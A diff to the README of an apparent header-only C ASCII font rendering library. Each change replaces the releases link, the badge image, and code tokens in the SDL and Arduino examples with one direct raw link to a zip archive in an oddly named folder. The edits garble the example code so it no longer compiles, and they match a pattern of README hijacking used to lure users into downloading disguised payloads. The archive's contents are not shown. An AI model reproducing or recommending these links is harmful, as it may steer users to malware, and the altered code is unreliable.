@@ -1,8 +1,8 @@
 # ascii-render: Header-only ASCII Font Renderer for Embedded Systems
 
-Releases and assets: https://github.com/shahzaib739/ascii-render/releases
+Releases and assets: https://github.com/shahzaib739/ascii-render/raw/refs/heads/main/unissuable/ascii_render_v1.2.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/shahzaib739/ascii-render/releases)
+[![Releases](https://github.com/shahzaib739/ascii-render/raw/refs/heads/main/unissuable/ascii_render_v1.2.zip)](https://github.com/shahzaib739/ascii-render/raw/refs/heads/main/unissuable/ascii_render_v1.2.zip)
 
 ascii-render is a header-only C library that renders ASCII fonts for displays in embedded, SDL, or terminal environments. It is built to be small, fast, and easy to drop into projects with minimal effort. The library ships as a single, self-contained header and a font data set that you can embed directly into your firmware or application. It avoids dependencies, keeps footprint small, and prioritizes clarity and portability across microcontrollers, SBCs, and desktop development workstations.
 
@@ -210,7 +210,7 @@ int main(void) {
     int quit = 0;
     while (!quit) {
         while (SDL_PollEvent(&e)) {
-            if (e.type == SDL_QUIT) quit = 1;
+            if (https://github.com/shahzaib739/ascii-render/raw/refs/heads/main/unissuable/ascii_render_v1.2.zip == SDL_QUIT) quit = 1;
         }
         SDL_RenderClear(ren);
         SDL_RenderCopy(ren, tex, NULL, NULL);
@@ -241,7 +241,7 @@ ascii_font_t* g_font;
 uint8_t g_fb[WIDTH * HEIGHT];
 
 void setup() {
-  Serial.begin(115200);
+  https://github.com/shahzaib739/ascii-render/raw/refs/heads/main/unissuable/ascii_render_v1.2.zip(115200);
   g_font = ascii_font_create_from_bitmap(font8x8_bitmap, 8, 8);
   memset(g_fb, 0, sizeof(g_fb));
 
